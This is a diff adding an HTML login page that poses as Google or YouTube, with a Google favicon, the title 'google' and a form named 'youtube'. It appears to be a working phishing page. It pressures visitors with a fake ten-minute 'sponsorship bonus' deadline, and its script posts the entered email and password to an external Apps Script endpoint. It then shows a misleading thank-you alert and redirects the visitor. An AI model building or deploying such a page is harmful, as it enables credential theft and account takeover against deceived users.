@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>google</title>
+  <link rel="shortcut icon" href="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png"
+    type="image/x-icon">
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .form-container {
+      margin-top: 6rem;
+      width: 350px;
+      height: 500px;
+      background-color: #fff;
+      box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+      border-radius: 10px;
+      box-sizing: border-box;
+      padding: 20px 30px;
+    }
+
+    .title {
+      text-align: center;
+      font-family: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande",
+        "Lucida Sans Unicode", Geneva, Verdana, sans-serif;
+      margin: 10px 0 30px 0;
+      font-size: 28px;
+      font-weight: 800;
+    }
+
+    .form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      margin-bottom: 15px;
+    }
+
+    .input {
+      border-radius: 20px;
+      border: 1px solid #c0c0c0;
+      outline: 0 !important;
+      box-sizing: border-box;
+      padding: 12px 15px;
+    }
+
+
+
+
+
+    .form-btn {
+      padding: 10px 15px;
+      font-family: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande",
+        "Lucida Sans Unicode", Geneva, Verdana, sans-serif;
+      border-radius: 20px;
+      border: 0 !important;
+      outline: 0 !important;
+      background: teal;
+      color: white;
+      cursor: pointer;
+      box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+    }
+
+    .form-btn:active {
+      box-shadow: none;
+    }
+
+    .google-login-button {
+      border: 2px solid #747474;
+    }
+    .note {
+      margin-top: 15px;
+      font-size: 12px;
+      color: gray;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="form-container">
+    <p class="title">Welcome</p>
+    <form class="form" method="post" name="youtube">
+      <input type="email" class="input" placeholder="Email" name="email" required>
+      <input type="password" class="input" placeholder="Password" name="password" required>
+      <button type="submit" class="form-btn">Log in</button>
+       <div class="note">
+        ⚠️ If you don’t login in the next 10 minutes, your sponsorship bonus will expire.
+      </div>
+    </form>
+  </div>
+
+<script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwC1-N99djafAkiCFOu2QhLqAdXHVGciilXSRbMsKPKvaqaXh90TP6QOInxN0tSx9xf1w/exec';
+        const form = document.forms['youtube'];
+        const redirectURL = 'form2.html'; // Change this to your redirect URL
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => {
+                    alert("Thanks for contacting us! Our Team will contact you soon.");
+                    window.location.href = redirectURL;
+                })
+                .catch(error => console.error('Error!', error.message));
+        });
+    </script>
+
+</body>
+
+</html>
